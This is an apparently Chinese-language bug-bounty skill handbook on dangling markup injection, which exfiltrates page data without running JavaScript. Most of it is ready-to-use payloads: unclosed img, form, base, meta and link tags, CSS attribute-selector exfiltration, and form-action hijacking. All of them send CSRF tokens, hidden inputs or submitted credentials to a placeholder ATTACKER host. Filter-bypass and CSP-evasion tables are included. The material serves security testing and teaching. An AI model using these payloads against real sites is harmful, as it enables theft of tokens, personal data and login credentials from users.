---
name: dangling-markup
description: CWE: CWE-79 / CWE-94 | OWASP: WSTG-INPV-02 (变体) / A03:2021 核心: HTML 上下文注入时, 即使无法执行脚本(CSP 严 / 标签过滤), 仍能用 "未闭合的 HTML 属性" 截取后续 DOM 内容外发 赏金: CS…
category: vuln
tags: [client]
---

# Dangling Markup Injection 深度手册

← 回主入口 [../../SKILL.md](../../SKILL.md)

> **CWE**: CWE-79 / CWE-94 | **OWASP**: WSTG-INPV-02 (变体) / A03:2021
> **核心**: HTML 上下文注入时, 即使无法执行脚本(CSP 严 / 标签过滤), 仍能用 "未闭合的 HTML 属性" 截取后续 DOM 内容外发
> **赏金**: CSP 严但存在 HTML 注入的场景下是 XSS 的 **唯一出路**, 中-高价值

---

## 0. First-pass Payload Set

```html
<img src='//ATTACKER/?
<img src="//ATTACKER/?
<meta http-equiv=refresh content='0;url=//ATTACKER/?
<base href='//ATTACKER/
<link rel=icon href='//ATTACKER/?
<form action='//ATTACKER/' method=post><input name=x value='
<textarea>
<noscript><p title='&lt;/noscript&gt;&lt;img src=//ATTACKER onerror=...&gt;
```

`ATTACKER` 替换为你的 OOB 子域 (interactsh / Collaborator)。

---

## 1. 核心原理

HTML 的属性值若没闭合, 浏览器会把后续文档内容都吃进属性, 直到遇到闭合引号:

```html
<!-- 注入 payload: -->
<img src='//ATTACKER/?

<!-- 渲染后变成: -->
<img src='//ATTACKER/?<p>敏感 CSRF token: abc123</p><form>...'>
<!-- 浏览器发请求: GET //ATTACKER/?<p>敏感 CSRF token: abc123</p>... -->
```

这样**不需要 JS 执行**, 仅靠浏览器的 HTML 解析 + 资源加载, 就能把 token / session / CSRF / 个人信息外发。

---

## 2. 与传统 XSS 的区别

| 特性 | 传统 XSS | Dangling Markup |
|------|---------|----------------|
| 需要 JS 执行 | ✅ | ❌ (仅 HTML 解析) |
| CSP `script-src 'none'` | 挂 | 仍可打 (靠 img/form 等资源加载) |
| CSP `unsafe-inline` 禁 | 挂 | 仍可打 |
| 浏览器 X-XSS-Protection | 部分拦 | 不拦 |
| 能窃取 cookie | ✅ | ❌ (cookie 不进 DOM) |
| 能窃取 CSRF token | ✅ | ✅ (HTML 里的隐藏 input) |
| 能窃取页面敏感数据 | ✅ | ✅ |

---

## 3. 绕过 CSP 的具体 sink

### 3.1 图片(最常用)

```html
<img src='//ATTACKER/?

<!-- 或结合事件属性 -->
<img srcset='
```

CSP `img-src *` 或 `img-src 'self' data:` 都允许 — 实际 CSP 里 img-src 通常很宽松。

### 3.2 iframe / form / link / base / meta / object

```html
<!-- form 劫持 -->
<form action='//ATTACKER/' method=GET>
<!-- 后续所有 input 会跟 form 走, 用户提交就带走数据 -->

<!-- base href 劫持 -->
<base href='//ATTACKER/'>
<!-- 后续所有相对路径请求都指向 evil 域 -->

<!-- link rel=icon 不停拉 favicon, 外带数据 -->
<link rel=icon href='//ATTACKER/?

<!-- meta refresh 跳走 -->
<meta http-equiv=refresh content='0;url=//ATTACKER/?

<!-- object / embed -->
<object data='//ATTACKER/?
<embed src='//ATTACKER/?
```

### 3.3 Scroll-to-Text Fragment (现代浏览器特性)

```html
<!-- 如果只能注入到 URL 的 fragment: -->
#:~:text=<敏感文本>
<!-- 浏览器自动滚动到该文本, 结合 :target CSS 可外带 -->
```

---

## 4. 实战场景

### 4.1 窃取 CSRF token (最经典)

```html
<!-- 原页面: -->
<form action=/profile method=POST>
  <input type=hidden name=csrf value=ABC123>
  <input name=email>
  <button>Save</button>
</form>

<!-- 攻击者在评论区注入: -->
<img src='//ATTACKER/?

<!-- 渲染后, 浏览器会拼接到闭合单引号: -->
<img src='//ATTACKER/?<form action=/profile method=POST><input type=hidden name=csrf value=ABC123>...'>

<!-- 发送请求: GET //ATTACKER/?<form>...value=ABC123... -->
<!-- 攻击者日志里拿到 ABC123 -->
```

### 4.2 劫持 form 提交

```html
<!-- 注入到登录页上方: -->
<form action='//ATTACKER/login' method=POST>
<!-- 用户在真正登录表单输入账号密码, 点提交 -->
<!-- 浏览器看到第一个 form 在上面, 其实际 action 是 //ATTACKER -->
```

关键: 如果注入点在 legitimate form 之前, 攻击者 form 可"包裹"真表单的 input。

### 4.3 CSS Exfiltration (style 属性)

```html
<style>
input[value^="a"]{background:url(//ATTACKER/?a)}
input[value^="b"]{background:url(//ATTACKER/?b)}
...
</style>
```

每个字符逐位爆破, 慢但可穿过 CSP `script-src 'none'`。

### 4.4 SVG 内嵌 HTML

```xml
<svg><foreignObject><body><img src='//ATTACKER/?...</body></foreignObject></svg>
```

---

## 5. 绕过常见拦截

| 过滤 | 绕过 |
|------|------|
| `<` 被转义 | 找反射后无转义的点, 如 CSS / JSON |
| 引号被转义 | 用无引号属性 `src=//ATTACKER/?` |
| 单引号过滤 | 用双引号或反引号 |
| 所有 `<` 被过滤 | 试 HTML 实体 `&lt;` → 在某些上下文解码 |
| 只过滤 `<script>` | 用 `<img>` / `<iframe>` / `<form>` |
| 限制 src 域 | `src='//ATTACKER.target.com'` (子域接管) |

---

## 6. 浏览器差异

| 浏览器 | 行为 |
|--------|------|
| Chrome | 严格闭合, dangling 属性通常吞到下一个引号 |
| Firefox | 类似 Chrome, 但 CSS selector 性能更好 (exfil 更快) |
| Safari | 某些边角更宽松, 极少见但可专测 |
| IE / Edge Legacy | 已 EOL, 不再主流 |

现代浏览器对 dangling markup 的 **mitigation**: Chrome 80+ 对 `<img src='//evil/?` 这种会在第一个换行处截断 — 但很多框架仍受影响。

---

## 7. Testing Checklist

- [ ] 找到 HTML 上下文反射点, 确认 `<` 和引号是否过滤
- [ ] 如果 CSP 严 (`script-src 'none'` 或 `strict-dynamic`) 但 HTML 注入仍可行 → 重点测 dangling
- [ ] 至少测 4 种 sink: img / form / base / meta
- [ ] 验证能否带走 CSRF token / 敏感 input 值
- [ ] 长 payload 别忘了 payload 能不能完整写入 (有些点会截断)
- [ ] 配合 OOB 日志收外带数据

---

## 8. False Positive Traps

| 陷阱 | 真相 |
|------|------|
| `<img src='//ATTACKER'>` 发请求但 URL 后没 token | payload 被框架闭合了, 无法吃后续 DOM |
| Chrome 80+ 在空格/换行处截断属性 | 修改 payload 用 `%0A` 填充 |
| 收到请求但无敏感数据 | 可能敏感 data 在 payload 之前, 调整注入位置 |
| CSP 含 `img-src 'self'` | 换 form / base / link icon, img 不可行 |
| 浏览器缓存了 favicon 不重发 | 用随机查询参数 `<link rel=icon href='//ATTACKER/?${random}?` |

---

## 9. 影响证明

- **低**: 仅能发出请求到攻击者域, 未带敏感数据
- **中**: 带走页面部分文本 (非敏感)
- **高**: 带走 CSRF token / 隐藏 input / 个人信息字段
- **严重**: form action 劫持导致用户提交被捕获 (账号密码 / 支付卡号)

---

## 10. 相关参考

- 主入口 → [../../SKILL.md](../../SKILL.md)
- XSS 主文件(非 CSP 严场景优先用) → [xss.md](xss.md) + [xss-scenarios.md](xss-scenarios.md)
- CSP 绕过矩阵 → [xss-scenarios.md](xss-scenarios.md) §1
- CSRF → [csrf-clickjacking.md](csrf-clickjacking.md)

---

**CWE**: CWE-79 / CWE-94 | **WSTG**: INPV-02 | **CVSS 典型**: 6.1 (窃取 CSRF token) / 8.0 (form 劫持 + 敏感提交)
